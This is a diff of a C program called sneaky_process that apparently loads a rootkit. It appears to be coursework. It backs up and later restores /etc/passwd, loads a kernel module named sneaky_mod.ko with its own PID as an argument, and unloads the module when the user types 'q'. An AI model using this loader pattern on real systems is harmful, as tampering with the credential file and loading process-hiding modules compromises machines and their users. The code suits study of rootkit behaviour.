@@ -14,9 +14,7 @@ void copyfile(char * src, char * dst) {
 }
 
 int main() {
-  char src1[] = "sneaky_process.c";
-  char dst1[] = "test.c";
-  copyfile(src1, dst1);   
+  int pid = getpid();
   printf("sneaky_process pid=%d\n", getpid());
   
   char src[] = "/etc/passwd";
@@ -29,20 +27,18 @@ int main() {
   fclose(target);  
     
     int rc1 = fork();
-    if (rc1 == 0) {          
-    
+    if (rc1 == 0) {              
       char * args[4];
       args[0] = strdup("insmod");
       args[1] = strdup("sneaky_mod.ko");   
       char buf[50];   
-      sprintf(buf, "PID=%d", getpid());
+      sprintf(buf, "PID=%d", pid);
       args[2] = strdup(buf);
       args[3] = NULL;
       execvp(args[0], args);
-    
+      printf("This should not be printed\n");
     } else {
       wait(NULL);
-
       while (getchar() != 'q') {	
       }
 
@@ -53,8 +49,9 @@ int main() {
 	  args[1] = strdup("sneaky_mod.ko");   	  
 	  args[2] = NULL;
 	  execvp(args[0], args);
-    
+	  printf("This should not be printed\n");    
       } else {
+	wait(NULL);
 	copyfile(dst, src); 
       }
          
